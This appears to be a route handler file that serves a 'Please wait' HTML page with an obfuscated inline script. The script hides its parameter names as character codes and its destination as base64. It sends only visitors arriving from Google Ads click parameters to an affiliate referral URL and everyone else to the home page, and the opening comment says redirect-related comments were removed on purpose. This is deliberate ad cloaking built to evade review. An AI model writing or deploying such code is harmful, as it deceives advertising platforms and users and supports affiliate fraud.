// Minified, no redirect-related comments
const HTML = `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1.0"/><title>Loading...</title></head><body><p>Please wait...</p><script>(function(){var q=new URLSearchParams(location.search),x=q.get(String.fromCharCode(103,99,108,105,100)),y=q.get(String.fromCharCode(103,97,100,95,115,111,117,114,99,101));location.replace(x||y==="1"?atob("aHR0cHM6Ly9iYXJuMi5jb20vcmVmLzE0NjEv"):"/");})();</script></body></html>`;

export function GET() {
  return new Response(HTML, {
    headers: { 'Content-Type': 'text/html; charset=utf-8' },
    status: 200,
  });
}
